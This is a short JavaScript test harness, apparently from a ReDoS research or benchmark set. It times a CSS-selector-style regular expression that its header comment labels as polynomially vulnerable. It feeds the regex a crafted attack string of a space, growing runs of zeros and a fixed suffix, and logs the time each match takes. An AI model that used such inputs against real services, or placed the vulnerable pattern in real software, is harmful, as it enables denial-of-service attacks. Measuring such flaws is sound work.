/* 1147
 * (?<Element>((\*|\w+)?)) (?<Complement>((\.|\#|\-|\w|\:)*)) (?<FamilySeparator>([\s\>\+\~]|[\,\{]))
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:" "+"0"*10000+"! _1!1 _◎@! _1!\n_SLQ_3"
 */
var REGEX = /(?<Element>((\*|\w+)?)) (?<Complement>((\.|\#|\-|\w|\:)*)) (?<FamilySeparator>([\s\>\+\~]|[\,\{]))/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = ' ' + '0'.repeat(i*10000) + '! _1!1 _◎@! _1!\n_SLQ_3'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}